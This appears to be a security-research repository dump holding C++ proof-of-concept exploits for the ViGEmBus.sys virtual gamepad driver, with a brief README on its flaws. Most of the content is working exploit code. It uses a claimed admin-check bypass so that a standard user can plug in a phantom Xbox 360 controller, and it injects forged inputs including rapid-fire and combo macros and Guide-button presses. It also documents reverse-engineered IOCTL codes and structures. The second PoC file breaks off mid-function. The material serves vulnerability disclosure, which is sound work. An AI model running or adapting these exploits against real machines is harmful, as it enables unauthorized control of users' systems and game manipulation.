Project Path: arc_CyberSecurityUP_ViGEmBus-Driver-Exploitation_3o2b6ufo

Source Tree:

```txt
arc_CyberSecurityUP_ViGEmBus-Driver-Exploitation_3o2b6ufo
├── README.md
├── ViGEmBus.sys
├── ViGEmBus.sys.i64
├── vigem_ghost_controller.cpp
├── vigem_poc 2.cpp
└── vigem_poc.cpp

```

`README.md`:

```md
##  Summary

ViGEmBus.sys is a kernel-mode driver used for virtual gamepad emulation (Xbox 360, DualShock 4). It is widely used in projects such as DS4Windows, BetterJoy, and other controller remapping tools. Static analysis revealed multiple vulnerabilities and security weaknesses in the driver design, including flaws in access validation, use of obsolete/insecure APIs, and race conditions in IOCTL processing. Some of these vulnerabilities could allow privilege escalation (EoP) or denial-of-service (DoS/BSOD) attacks in specific scenarios.

```

`vigem_ghost_controller.cpp`:

```cpp
/*
 * ViGEmBus.sys — Ghost Controller Visual PoC
 * =============================================
 * 
 * Demonstrates VULN-01 (SeTokenIsAdmin bypass) by creating a phantom
 * Xbox 360 controller from a non-admin process and injecting inputs
 * in real-time. Opens the Windows Game Controller panel (joy.cpl) so
 * the user can VISUALLY SEE the ghost controller and its inputs.
 *
 * Additionally demonstrates input injection attack potential by
 * simulating gamepad combos that trigger Xbox Game Bar (Win+G equivalent)
 * and navigate system UI — all from an unprivileged user.
 *
 * Build:  cl.exe /EHsc /W4 /O2 vigem_ghost_controller.cpp /link setupapi.lib advapi32.lib
 * Run:    vigem_ghost_controller.exe   (from standard user — no admin needed)
 *
 * AUTHORIZED SECURITY RESEARCH ONLY.
 */

#include <windows.h>
#include <setupapi.h>
#include <initguid.h>
#include <stdio.h>
#include <stdlib.h>
#include <math.h>

#pragma comment(lib, "setupapi.lib")
#pragma comment(lib, "advapi32.lib")

// ── ViGEmBus GUID & IOCTLs ────────────────────────────────────────
DEFINE_GUID(GUID_DEVINTERFACE_VIGEMBUS,
    0x96E42B22, 0xF5E9, 0x42F8,
    0xB0, 0x43, 0xED, 0x0F, 0x93, 0x2F, 0x01, 0x4F);

#define IOCTL_VIGEM_PLUGIN              0x002AA004
#define IOCTL_VIGEM_UNPLUG              0x002AA008
#define IOCTL_XUSB_SUBMIT_REPORT        0x002AA80C

// ── Structures (from RE) ──────────────────────────────────────────
#pragma pack(push, 1)
typedef struct _VIGEM_PLUGIN_REQUEST {
    ULONG  Size;           // 0x10
    ULONG  SerialNumber;
    ULONG  TargetType;     // 0=Xbox360
    USHORT VendorId;
    USHORT ProductId;
} VIGEM_PLUGIN_REQUEST;

typedef struct _VIGEM_UNPLUG_REQUEST {
    ULONG  Size;           // 0x08
    ULONG  SerialNumber;
} VIGEM_UNPLUG_REQUEST;

typedef struct _XUSB_REPORT {
    ULONG  Size;           // 0x14
    ULONG  SerialNumber;
    USHORT wButtons;
    BYTE   bLeftTrigger;
    BYTE   bRightTrigger;
    SHORT  sThumbLX;
    SHORT  sThumbLY;
    SHORT  sThumbRX;
    SHORT  sThumbRY;
} XUSB_REPORT;
#pragma pack(pop)

static_assert(sizeof(XUSB_REPORT) == 0x14, "XUSB_REPORT must be 20 bytes");

// ── Button Defs ───────────────────────────────────────────────────
#define BTN_DPAD_UP        0x0001
#define BTN_DPAD_DOWN      0x0002
#define BTN_DPAD_LEFT      0x0004
#define BTN_DPAD_RIGHT     0x0008
#define BTN_START          0x0010
#define BTN_BACK           0x0020
#define BTN_LEFT_THUMB     0x0040
#define BTN_RIGHT_THUMB    0x0080
#define BTN_LB             0x0100
#define BTN_RB             0x0200
#define BTN_GUIDE          0x0400
#define BTN_A              0x1000
#define BTN_B              0x2000
#define BTN_X              0x4000
#define BTN_Y              0x8000

// ── Globals ───────────────────────────────────────────────────────
static HANDLE   g_hDevice  = INVALID_HANDLE_VALUE;
static ULONG    g_serial   = 1;
static BOOL     g_running  = TRUE;

// ── Console helpers ───────────────────────────────────────────────
static HANDLE hCon;

void SetColor(WORD c) { SetConsoleTextAttribute(hCon, c); }

void Banner()
{
    SetColor(0x0C);
    printf("\n");
    printf("  ╔══════════════════════════════════════════════════════╗\n");
    printf("  ║                                                      ║\n");
    printf("  ║   "); SetColor(0x0F);
    printf("GHOST CONTROLLER  —  ViGEmBus VULN-01 PoC"); SetColor(0x0C);
    printf("      ║\n");
    printf("  ║                                                      ║\n");
    printf("  ╚══════════════════════════════════════════════════════╝\n");
    SetColor(0x07);
    printf("\n");
}

void PrintTag(const char* tag, WORD tagColor, const char* fmt, ...)
{
    SetColor(tagColor);
    printf("  [%s] ", tag);
    SetColor(0x07);
    va_list args;
    va_start(args, fmt);
    vprintf(fmt, args);
    va_end(args);
    printf("\n");
}

#define LOG_OK(...)    PrintTag("+", 0x0A, __VA_ARGS__)
#define LOG_FAIL(...)  PrintTag("!", 0x0C, __VA_ARGS__)
#define LOG_INFO(...)  PrintTag("*", 0x0B, __VA_ARGS__)
#define LOG_WARN(...)  PrintTag("~", 0x0E, __VA_ARGS__)
#define LOG_GHOST(...) PrintTag("\xE8", 0x0D, __VA_ARGS__)  // ghost icon

// ── CTRL+C handler ───────────────────────────────────────────────
BOOL WINAPI CtrlHandler(DWORD type)
{
    if (type == CTRL_C_EVENT || type == CTRL_BREAK_EVENT)
    {
        g_running = FALSE;
        return TRUE;
    }
    return FALSE;
}

// ── Device communication ─────────────────────────────────────────
HANDLE OpenViGEmBus()
{
    HDEVINFO devInfo = SetupDiGetClassDevsW(
        &GUID_DEVINTERFACE_VIGEMBUS, NULL, NULL,
        DIGCF_PRESENT | DIGCF_DEVICEINTERFACE);

    if (devInfo == INVALID_HANDLE_VALUE) return INVALID_HANDLE_VALUE;

    SP_DEVICE_INTERFACE_DATA ifData = { sizeof(SP_DEVICE_INTERFACE_DATA) };
    if (!SetupDiEnumDeviceInterfaces(devInfo, NULL,
            &GUID_DEVINTERFACE_VIGEMBUS, 0, &ifData))
    {
        SetupDiDestroyDeviceInfoList(devInfo);
        return INVALID_HANDLE_VALUE;
    }

    DWORD size = 0;
    SetupDiGetDeviceInterfaceDetailW(devInfo, &ifData, NULL, 0, &size, NULL);

    auto detail = (PSP_DEVICE_INTERFACE_DETAIL_DATA_W)malloc(size);
    detail->cbSize = sizeof(SP_DEVICE_INTERFACE_DETAIL_DATA_W);
    SetupDiGetDeviceInterfaceDetailW(devInfo, &ifData, detail, size, NULL, NULL);

    HANDLE h = CreateFileW(detail->DevicePath,
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL, OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, NULL);

    free(detail);
    SetupDiDestroyDeviceInfoList(devInfo);
    return h;
}

BOOL SendIoctl(DWORD code, PVOID in, DWORD inSz, PVOID out, DWORD outSz)
{
    OVERLAPPED ov = {};
    ov.hEvent = CreateEventW(NULL, TRUE, FALSE, NULL);
    DWORD ret = 0;

    BOOL ok = DeviceIoControl(g_hDevice, code, in, inSz, out, outSz, &ret, &ov);
    if (!ok && GetLastError() == ERROR_IO_PENDING)
    {
        if (WaitForSingleObject(ov.hEvent, 3000) == WAIT_OBJECT_0)
            ok = GetOverlappedResult(g_hDevice, &ov, &ret, FALSE);
        else
            CancelIoEx(g_hDevice, &ov);
    }

    CloseHandle(ov.hEvent);
    return ok;
}

// ── Ghost controller operations ──────────────────────────────────
BOOL PluginGhost()
{
    VIGEM_PLUGIN_REQUEST req = {};
    req.Size         = sizeof(req);
    req.SerialNumber = g_serial;
    req.TargetType   = 0; // Xbox 360
    req.VendorId     = 0;
    req.ProductId    = 0;

    VIGEM_PLUGIN_REQUEST resp = {};
    return SendIoctl(IOCTL_VIGEM_PLUGIN, &req, sizeof(req), &resp, sizeof(resp));
}

void UnplugGhost()
{
    VIGEM_UNPLUG_REQUEST req = {};
    req.Size         = sizeof(req);
    req.SerialNumber = g_serial;
    SendIoctl(IOCTL_VIGEM_UNPLUG, &req, sizeof(req), NULL, 0);
}

BOOL SendReport(USHORT buttons, BYTE lt, BYTE rt,
                SHORT lx, SHORT ly, SHORT rx, SHORT ry)
{
    XUSB_REPORT rpt = {};
    rpt.Size          = sizeof(rpt);
    rpt.SerialNumber  = g_serial;
    rpt.wButtons      = buttons;
    rpt.bLeftTrigger  = lt;
    rpt.bRightTrigger = rt;
    rpt.sThumbLX      = lx;
    rpt.sThumbLY      = ly;
    rpt.sThumbRX      = rx;
    rpt.sThumbRY      = ry;

    XUSB_REPORT resp = {};
    return SendIoctl(IOCTL_XUSB_SUBMIT_REPORT, &rpt, sizeof(rpt), &resp, sizeof(resp));
}

void ReleaseAll()
{
    SendReport(0, 0, 0, 0, 0, 0, 0);
}

// ── Visual controller display ────────────────────────────────────
void DrawController(USHORT btn, BYTE lt, BYTE rt,
                    SHORT lx, SHORT ly, SHORT rx, SHORT ry)
{
    // Move cursor up to overwrite previous frame
    printf("\033[18A");

    SetColor(0x08);
    printf("  ┌───────────────────────────────────────────────────┐\n");

    // Bumpers + Triggers
    SetColor(0x08); printf("  │  ");
    SetColor(btn & BTN_LB ? 0x0E : 0x08); printf("[LB]");
    SetColor(0x08); printf("                               ");
    SetColor(btn & BTN_RB ? 0x0E : 0x08); printf("[RB]");
    SetColor(0x08); printf("  │\n");

    printf("  │  ");
    SetColor(lt > 10 ? 0x0C : 0x08); printf("LT:%-3u", lt);
    SetColor(0x08); printf("                           ");
    SetColor(rt > 10 ? 0x0C : 0x08); printf("RT:%-3u", rt);
    SetColor(0x08); printf("  │\n");

    printf("  │                                                   │\n");

    // D-Pad + Face Buttons
    printf("  │      ");
    SetColor(btn & BTN_DPAD_UP ? 0x0E : 0x08);    printf("↑");
    SetColor(0x08); printf("                               ");
    SetColor(btn & BTN_Y ? 0x0E : 0x08);           printf("Y");
    SetColor(0x08); printf("      │\n");

    printf("  │    ");
    SetColor(btn & BTN_DPAD_LEFT ? 0x0E : 0x08);  printf("←");
    SetColor(0x08); printf(" · ");
    SetColor(btn & BTN_DPAD_RIGHT ? 0x0E : 0x08); printf("→");
    SetColor(0x08); printf("                           ");
    SetColor(btn & BTN_X ? 0x0E : 0x08);           printf("X");
    SetColor(0x08); printf(" · ");
    SetColor(btn & BTN_B ? 0x0E : 0x08);           printf("B");
    SetColor(0x08); printf("    │\n");

    printf("  │      ");
    SetColor(btn & BTN_DPAD_DOWN ? 0x0E : 0x08);  printf("↓");
    SetColor(0x08); printf("                               ");
    SetColor(btn & BTN_A ? 0x0A : 0x08);           printf("A");
    SetColor(0x08); printf("      │\n");

    printf("  │                                                   │\n");

    // Sticks (normalize to -4..+4 grid)
    int lxn = (int)((float)lx / 32767.0f * 4);
    int lyn = (int)((float)ly / 32767.0f * 4);
    int rxn = (int)((float)rx / 32767.0f * 4);
    int ryn = (int)((float)ry / 32767.0f * 4);

    printf("  │    ");
    SetColor(btn & BTN_LEFT_THUMB ? 0x0E : 0x0B);
    printf("[L:%+2d,%+2d]", lxn, lyn);
    SetColor(0x08);
    printf("          ");
    SetColor(btn & BTN_GUIDE ? 0x0F : 0x08);
    printf("(X)");
    SetColor(0x08);
    printf("          ");
    SetColor(btn & BTN_RIGHT_THUMB ? 0x0E : 0x0B);
    printf("[R:%+2d,%+2d]", rxn, ryn);
    SetColor(0x08);
    printf("    │\n");

    printf("  │                                                   │\n");

    // Start/Back
    printf("  │                ");
    SetColor(btn & BTN_BACK ? 0x0E : 0x08);  printf("[BACK]");
    SetColor(0x08); printf("   ");
    SetColor(btn & BTN_START ? 0x0E : 0x08); printf("[START]");
    SetColor(0x08); printf("               │\n");

    printf("  │                                                   │\n");

    // Status bar
    SetColor(0x08);
    printf("  │  ");
    SetColor(0x0D);
    printf(">> GHOST ACTIVE — injecting from unprivileged user");
    SetColor(0x08);
    printf("  │\n");

    printf("  │  ");
    SetColor(0x0A);
    printf(">> Buttons: 0x%04X  LT:%3u RT:%3u", btn, lt, rt);
    printf("                ");
    SetColor(0x08);
    printf("│\n");

    printf("  └───────────────────────────────────────────────────┘\n");

    SetColor(0x07);
}

// ── Attack sequences ─────────────────────────────────────────────

// Demo 1: Flash all buttons one by one
void Demo_ButtonSweep()
{
    LOG_GHOST("Demo: Button sweep — watch the controller light up");
    Sleep(500);

    USHORT buttons[] = {
        BTN_A, BTN_B, BTN_X, BTN_Y,
        BTN_DPAD_UP, BTN_DPAD_RIGHT, BTN_DPAD_DOWN, BTN_DPAD_LEFT,
        BTN_LB, BTN_RB, BTN_START, BTN_BACK,
        BTN_LEFT_THUMB, BTN_RIGHT_THUMB, BTN_GUIDE
    };

    for (int i = 0; i < _countof(buttons) && g_running; i++)
    {
        SendReport(buttons[i], 0, 0, 0, 0, 0, 0);
        DrawController(buttons[i], 0, 0, 0, 0, 0, 0);
        Sleep(200);
        ReleaseAll();
        DrawController(0, 0, 0, 0, 0, 0, 0);
        Sleep(100);
    }
}

// Demo 2: Circular stick motion (proves analog injection)
void Demo_StickCircle()
{
    LOG_GHOST("Demo: Analog stick circles — full axis control");
    Sleep(500);

    for (int frame = 0; frame < 120 && g_running; frame++)
    {
        float angle  = (float)frame * 0.1f;
        float angle2 = (float)frame * -0.15f;

        SHORT lx = (SHORT)(sinf(angle)  * 32000);
        SHORT ly = (SHORT)(cosf(angle)  * 32000);
        SHORT rx = (SHORT)(sinf(angle2) * 32000);
        SHORT ry = (SHORT)(cosf(angle2) * 32000);

        BYTE lt = (BYTE)((sinf(angle * 0.5f) + 1.0f) * 127);
        BYTE rt = (BYTE)((cosf(angle * 0.5f) + 1.0f) * 127);

        SendReport(0, lt, rt, lx, ly, rx, ry);
        DrawController(0, lt, rt, lx, ly, rx, ry);
        Sleep(33);  // ~30fps
    }
    ReleaseAll();
}

// Demo 3: Xbox Game Bar trigger (Guide button hold)
void Demo_GuideButton()
{
    LOG_GHOST("Demo: Guide button press — triggers Xbox Game Bar on Win10/11");
    Sleep(500);

    // Hold Guide for 1 second
    for (int i = 0; i < 30 && g_running; i++)
    {
        SendReport(BTN_GUIDE, 0, 0, 0, 0, 0, 0);
        DrawController(BTN_GUIDE, 0, 0, 0, 0, 0, 0);
        Sleep(33);
    }

    Sleep(500);
    ReleaseAll();
    DrawController(0, 0, 0, 0, 0, 0, 0);
}

// Demo 4: Rapid-fire A button (game cheat simulation)
void Demo_RapidFire()
{
    LOG_GHOST("Demo: Rapid-fire A button — game manipulation");
    Sleep(500);

    for (int i = 0; i < 40 && g_running; i++)
    {
        USHORT btn = (i % 2 == 0) ? BTN_A : 0;
        BYTE lt = (i % 2 == 0) ? 255 : 0;

        SendReport(btn, lt, 0, 0, 0, 0, 0);
        DrawController(btn, lt, 0, 0, 0, 0, 0);
        Sleep(50);
    }
    ReleaseAll();
}

// Demo 5: Combo sequence — simulates game input macro
void Demo_ComboAttack()
{
    LOG_GHOST("Demo: Fighting game combo injection (macro attack)");
    Sleep(500);

    struct { USHORT btn; BYTE lt; BYTE rt; SHORT lx; SHORT ly; int ms; } combo[] = {
        { BTN_DPAD_DOWN,                    0, 0,      0,      0,  80 },
        { BTN_DPAD_DOWN | BTN_DPAD_RIGHT,   0, 0,      0,      0,  80 },
        { BTN_DPAD_RIGHT,                   0, 0,      0,      0,  80 },
        { BTN_X,                            0, 0,      0,      0, 120 },
        { 0,                                0, 0,      0,      0,  50 },
        { BTN_Y,                            0, 0,      0,      0, 100 },
        { 0,                                0, 0,      0,      0,  50 },
        { BTN_RB,                         255, 0,      0,      0, 150 },
        { BTN_A | BTN_X | BTN_Y,          255, 255, 32000, 32000, 200 },
        { 0,                                0, 0,      0,      0, 100 },
    };

    for (int rep = 0; rep < 2 && g_running; rep++)
    {
        for (int i = 0; i < _countof(combo) && g_running; i++)
        {
            auto& c = combo[i];
            SendReport(c.btn, c.lt, c.rt, c.lx, c.ly, 0, 0);
            DrawController(c.btn, c.lt, c.rt, c.lx, c.ly, 0, 0);
            Sleep(c.ms);
        }
    }
    ReleaseAll();
}

// ── Main ─────────────────────────────────────────────────────────
int main()
{
    hCon = GetStdHandle(STD_OUTPUT_HANDLE);

    // Enable ANSI escape sequences for cursor control
    DWORD mode = 0;
    GetConsoleMode(hCon, &mode);
    SetConsoleMode(hCon, mode | ENABLE_VIRTUAL_TERMINAL_PROCESSING);

    SetConsoleCtrlHandler(CtrlHandler, TRUE);

    Banner();

    // Check privilege
    {
        BOOL isAdmin = FALSE;
        PSID admin = NULL;
        SID_IDENTIFIER_AUTHORITY ntAuth = SECURITY_NT_AUTHORITY;
        if (AllocateAndInitializeSid(&ntAuth, 2,
                SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS,
                0, 0, 0, 0, 0, 0, &admin))
        {
            CheckTokenMembership(NULL, admin, &isAdmin);
            FreeSid(admin);
        }

        if (isAdmin)
            LOG_WARN("Running as ADMIN — run as standard user for full PoC impact");
        else
            LOG_OK("Running as STANDARD USER — no admin privileges");
    }

    // Open device
    LOG_INFO("Connecting to ViGEmBus...");
    g_hDevice = OpenViGEmBus();
    if (g_hDevice == INVALID_HANDLE_VALUE)
    {
        LOG_FAIL("ViGEmBus not found! Install from: github.com/ViGEm/ViGEmBus/releases");
        return 1;
    }
    LOG_OK("Connected to ViGEmBus");

    // Plug in ghost controller
    LOG_INFO("Creating ghost Xbox 360 controller...");
    if (!PluginGhost())
    {
        LOG_FAIL("Failed to create ghost controller (error %u)", GetLastError());
        CloseHandle(g_hDevice);
        return 1;
    }
    LOG_OK("Ghost controller ACTIVE (Serial #%u)", g_serial);

    // Open joy.cpl so user can see the ghost
    LOG_GHOST("Opening Game Controllers panel — look for the phantom device!");
    Sleep(300);

    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = {};
    CreateProcessW(L"C:\\Windows\\System32\\control.exe",
                   (LPWSTR)L"control.exe joy.cpl",
                   NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
    if (pi.hProcess)
    {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    Sleep(2000);  // Wait for joy.cpl to open

    // Print initial empty controller frame (needed for overwrite)
    printf("\n");
    for (int i = 0; i < 18; i++) printf("\n");
    DrawController(0, 0, 0, 0, 0, 0, 0);

    // ── Run demos ──────────────────────────────────
    printf("\n");
    Demo_ButtonSweep();
    if (!g_running) goto cleanup;
    Sleep(500);

    Demo_StickCircle();
    if (!g_running) goto cleanup;
    Sleep(500);

    Demo_RapidFire();
    if (!g_running) goto cleanup;
    Sleep(500);

    Demo_ComboAttack();
    if (!g_running) goto cleanup;
    Sleep(500);

    Demo_GuideButton();
    if (!g_running) goto cleanup;
    Sleep(500);

    // Final status
    printf("\n\n");
    SetColor(0x0C);
    printf("  ╔══════════════════════════════════════════════════════╗\n");
    printf("  ║  IMPACT SUMMARY                                      ║\n");
    printf("  ╠══════════════════════════════════════════════════════╣\n");
    SetColor(0x07);
    printf("  ║                                                      ║\n");
    printf("  ║  "); SetColor(0x0A); printf("✓"); SetColor(0x07);
    printf(" Created phantom Xbox 360 controller             ║\n");
    printf("  ║  "); SetColor(0x0A); printf("✓"); SetColor(0x07);
    printf(" Injected button presses from standard user      ║\n");
    printf("  ║  "); SetColor(0x0A); printf("✓"); SetColor(0x07);
    printf(" Injected analog stick/trigger values             ║\n");
    printf("  ║  "); SetColor(0x0A); printf("✓"); SetColor(0x07);
    printf(" Triggered Xbox Game Bar via Guide button         ║\n");
    printf("  ║  "); SetColor(0x0A); printf("✓"); SetColor(0x07);
    printf(" Demonstrated game input manipulation             ║\n");
    printf("  ║                                                      ║\n");
    printf("  ║  "); SetColor(0x0E); printf("All operations performed WITHOUT admin rights"); SetColor(0x07);
    printf("   ║\n");
    printf("  ║                                                      ║\n");
    SetColor(0x0C);
    printf("  ╚══════════════════════════════════════════════════════╝\n");
    SetColor(0x07);

cleanup:
    printf("\n");
    LOG_INFO("Cleaning up — unplugging ghost controller...");
    ReleaseAll();
    Sleep(200);
    UnplugGhost();
    LOG_OK("Ghost controller removed");
    CloseHandle(g_hDevice);
    LOG_OK("Done.");

    return 0;
}

```

`vigem_poc 2.cpp`:

```cpp
/*
 * ViGEmBus.sys VULN-01 — SeTokenIsAdmin Bypass PoC
 * ==================================================
 *
 * Driver:  ViGEmBus.sys (Virtual Gamepad Emulation Bus Driver)
 * SHA256:  8fb8402b7266fa9b9ea8841708317c8c25367b2947eeda9b6462c0e4801f05a4
 * Vuln:    IOCTL access control callback (sub_140021700) fails to enforce
 *          admin privilege checks for IOCTL AccessType 0 and 5.
 *          Additionally, AccessType 4 with non-admin returns STATUS_SUCCESS
 *          instead of STATUS_ACCESS_DENIED.
 *
 * Impact:  Non-privileged user can plug/unplug virtual gamepad devices,
 *          submit forged HID reports, and interact with the kernel driver
 *          without administrator privileges.
 *
 * Build:   cl.exe /EHsc /W4 /O2 vigem_poc.cpp /link setupapi.lib
 *          (or: g++ -o vigem_poc.exe vigem_poc.cpp -lsetupapi)
 *
 * Usage:   Run from a standard (non-admin) user command prompt.
 *          The PoC will attempt to:
 *            1. Open a handle to ViGEmBus device (no admin required)
 *            2. Plug-in a virtual Xbox 360 controller
 *            3. Submit a forged input report
 *            4. Unplug the virtual device
 *
 * NOTE:    This PoC is for AUTHORIZED SECURITY RESEARCH ONLY.
 *          Intended for responsible disclosure / bug bounty purposes.
 */

#include <windows.h>
#include <setupapi.h>
#include <initguid.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#pragma comment(lib, "setupapi.lib")

// ============================================================================
// ViGEmBus Interface GUID (from binary at 0x140012930)
// Raw bytes: 22 2b e4 96 e9 f5 f8 42 b0 43 ed 0f 93 2f 01 4f
// ============================================================================
// {96E42B22-F5E9-42F8-B043-ED0F932F014F}
DEFINE_GUID(GUID_DEVINTERFACE_VIGEMBUS,
    0x96E42B22, 0xF5E9, 0x42F8,
    0xB0, 0x43, 0xED, 0x0F, 0x93, 0x2F, 0x01, 0x4F);

// ============================================================================
// IOCTL Codes (reconstructed from IoctlDispatchMultiplexer @ 0x140005610)
// All use DeviceType=0x002A, METHOD_BUFFERED
// ============================================================================
#define FILE_DEVICE_VIGEM       0x002A

// Core bus operations
#define IOCTL_VIGEM_PLUGIN              0x002AA004  // Func=0x801 - Plug in virtual device
#define IOCTL_VIGEM_UNPLUG              0x002AA008  // Func=0x802 - Unplug virtual device
#define IOCTL_VIGEM_CHECK_VERSION       0x002AA00C  // Func=0x803 - Check driver version
#define IOCTL_VIGEM_WAIT_DEVICE_READY   0x002AA010  // Func=0x804 - Wait for device ready

// Xbox 360 (XUSB) operations
#define IOCTL_XUSB_REQUEST_NOTIFICATION 0x002AA808  // Func=0xA02 - Request rumble notification
#define IOCTL_XUSB_SUBMIT_REPORT        0x002AA80C  // Func=0xA03 - Submit input report
#define IOCTL_XUSB_GET_USER_INDEX       0x002AE81C  // Func=0xA07 - Get user index

// DualShock 4 operations
#define IOCTL_DS4_SUBMIT_REPORT         0x002AA810  // Func=0xA04 - Submit DS4 report
#define IOCTL_DS4_REQUEST_NOTIFICATION  0x002AE804  // Func=0xA01 - Request DS4 notification

// ============================================================================
// ViGEm Target Types (from sub_140018000 plug-in logic)
// ============================================================================
#define VIGEM_TARGET_TYPE_XBOX360       0   // Alloc 288 bytes, VID=0x045E PID=0x028E
#define VIGEM_TARGET_TYPE_DUALSHOCK4    2   // Alloc 336 bytes, VID=0x054C PID=0x05C4

// ============================================================================
// Structures (reverse-engineered from IOCTL handlers)
// ============================================================================

// IOCTL_VIGEM_PLUGIN input buffer (16 bytes, validated at sub_140018000)
// Offset checks: [+0x0] must == 16, [+0x4] must != 0, [+0x8] = target type,
//                [+0xC] = vendor_id (WORD), [+0xE] = product_id (WORD)
#pragma pack(push, 1)
typedef struct _VIGEM_PLUGIN_REQUEST {
    ULONG  Size;           // +0x00: Must be sizeof(VIGEM_PLUGIN_REQUEST) == 16
    ULONG  SerialNumber;   // +0x04: Target serial (must be != 0, driver assigns)
    ULONG  TargetType;     // +0x08: 0=Xbox360, 2=DualShock4
    USHORT VendorId;       // +0x0C: USB VID (0 = use default)
    USHORT ProductId;      // +0x0E: USB PID (0 = use default)
} VIGEM_PLUGIN_REQUEST, *PVIGEM_PLUGIN_REQUEST;
#pragma pack(pop)

// IOCTL_VIGEM_UNPLUG input buffer (8 bytes, validated at sub_140018450)
#pragma pack(push, 1)
typedef struct _VIGEM_UNPLUG_REQUEST {
    ULONG  Size;           // +0x00: Must be sizeof(VIGEM_UNPLUG_REQUEST) == 8
    ULONG  SerialNumber;   // +0x04: Serial of device to unplug
} VIGEM_UNPLUG_REQUEST, *PVIGEM_UNPLUG_REQUEST;
#pragma pack(pop)

// IOCTL_XUSB_SUBMIT_REPORT input buffer (12 bytes)
#pragma pack(push, 1)
typedef struct _XUSB_SUBMIT_REPORT {
    ULONG  Size;           // +0x00: Must be 12
    ULONG  SerialNumber;   // +0x04: Serial of target device
    USHORT wButtons;       // +0x08: Button bitmask (XINPUT_GAMEPAD style)
    BYTE   bLeftTrigger;   // +0x0A: Left trigger (0-255)
    BYTE   bRightTrigger;  // +0x0B: Right trigger (0-255)
    // Note: The driver expects minimum 12 bytes at +0x8 for the report
} XUSB_SUBMIT_REPORT, *PXUSB_SUBMIT_REPORT;
#pragma pack(pop)

// Extended XUSB report (full 16 bytes matching what the driver reads)
#pragma pack(push, 1)
typedef struct _XUSB_SUBMIT_REPORT_FULL {
    ULONG  Size;           // +0x00: 16
    ULONG  SerialNumber;   // +0x04
    USHORT wButtons;       // +0x08
    BYTE   bLeftTrigger;   // +0x0A
    BYTE   bRightTrigger;  // +0x0B
    SHORT  sThumbLX;       // +0x0C
    SHORT  sThumbLY;       // +0x0E
} XUSB_SUBMIT_REPORT_FULL, *PXUSB_SUBMIT_REPORT_FULL;
#pragma pack(pop)

// ============================================================================
// XUSB Button Definitions
// ============================================================================
#define XUSB_GAMEPAD_DPAD_UP        0x0001
#define XUSB_GAMEPAD_DPAD_DOWN      0x0002
#define XUSB_GAMEPAD_DPAD_LEFT      0x0004
#define XUSB_GAMEPAD_DPAD_RIGHT     0x0008
#define XUSB_GAMEPAD_START          0x0010
#define XUSB_GAMEPAD_BACK           0x0020
#define XUSB_GAMEPAD_LEFT_THUMB     0x0040
#define XUSB_GAMEPAD_RIGHT_THUMB    0x0080
#define XUSB_GAMEPAD_LEFT_SHOULDER  0x0100
#define XUSB_GAMEPAD_RIGHT_SHOULDER 0x0200
#define XUSB_GAMEPAD_GUIDE          0x0400
#define XUSB_GAMEPAD_A              0x1000
#define XUSB_GAMEPAD_B              0x2000
#define XUSB_GAMEPAD_X              0x4000
#define XUSB_GAMEPAD_Y              0x8000

// ============================================================================
// Console colors for output
// ============================================================================
void PrintStatus(const char* tag, const char* msg, WORD color = 7)
{
    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
    SetConsoleTextAttribute(hConsole, color);
    printf("[%s] ", tag);
    SetConsoleTextAttribute(hConsole, 7);
    printf("%s\n", msg);
}

void PrintOk(const char* msg)    { PrintStatus("+", msg, 10); }  // Green
void PrintFail(const char* msg)  { PrintStatus("!", msg, 12); }  // Red
void PrintInfo(const char* msg)  { PrintStatus("*", msg, 11); }  // Cyan
void PrintWarn(const char* msg)  { PrintStatus("~", msg, 14); }  // Yellow

// ============================================================================
// Check if running as admin
// ============================================================================
BOOL IsRunningAsAdmin()
{
    BOOL isAdmin = FALSE;
    PSID adminGroup = NULL;
    SID_IDENTIFIER_AUTHORITY ntAuth = SECURITY_NT_AUTHORITY;

    if (AllocateAndInitializeSid(&ntAuth, 2,
            SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS,
            0, 0, 0, 0, 0, 0, &adminGroup))
    {
        CheckTokenMembership(NULL, adminGroup, &isAdmin);
        FreeSid(adminGroup);
    }
    return isAdmin;
}

// ============================================================================
// Open handle to ViGEmBus device via device interface
// ============================================================================
HANDLE OpenViGEmBus()
{
    HDEVINFO devInfoSet = SetupDiGetClassDevsW(
        &GUID_DEVINTERFACE_VIGEMBUS,
        NULL, NULL,
        DIGCF_PRESENT | DIGCF_DEVICEINTERFACE
    );

    if (devInfoSet == INVALID_HANDLE_VALUE)
    {
        PrintFail("SetupDiGetClassDevs failed - is ViGEmBus installed?");
        return INVALID_HANDLE_VALUE;
    }

    SP_DEVICE_INTERFACE_DATA ifData = {};
    ifData.cbSize = sizeof(SP_DEVICE_INTERFACE_DATA);

    if (!SetupDiEnumDeviceInterfaces(devInfoSet, NULL,
            &GUID_DEVINTERFACE_VIGEMBUS, 0, &ifData))
    {
        PrintFail("No ViGEmBus device interface found");
        SetupDiDestroyDeviceInfoList(devInfoSet);
        return INVALID_HANDLE_VALUE;
    }

    // Get required buffer size
    DWORD requiredSize = 0;
    SetupDiGetDeviceInterfaceDetailW(devInfoSet, &ifData, NULL, 0,
                                      &requiredSize, NULL);

    PSP_DEVICE_INTERFACE_DETAIL_DATA_W detailData =
        (PSP_DEVICE_INTERFACE_DETAIL_DATA_W)malloc(requiredSize);
    if (!detailData)
    {
        SetupDiDestroyDeviceInfoList(devInfoSet);
        return INVALID_HANDLE_VALUE;
    }

    detailData->cbSize = sizeof(SP_DEVICE_INTERFACE_DETAIL_DATA_W);

    if (!SetupDiGetDeviceInterfaceDetailW(devInfoSet, &ifData,
            detailData, requiredSize, NULL, NULL))
    {
        PrintFail("Failed to get device interface detail");
        free(detailData);
        SetupDiDestroyDeviceInfoList(devInfoSet);
        return INVALID_HANDLE_VALUE;
    }

    printf("    Device path: %ls\n", detailData->DevicePath);

    HANDLE hDevice = CreateFileW(
        detailData->DevicePath,
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
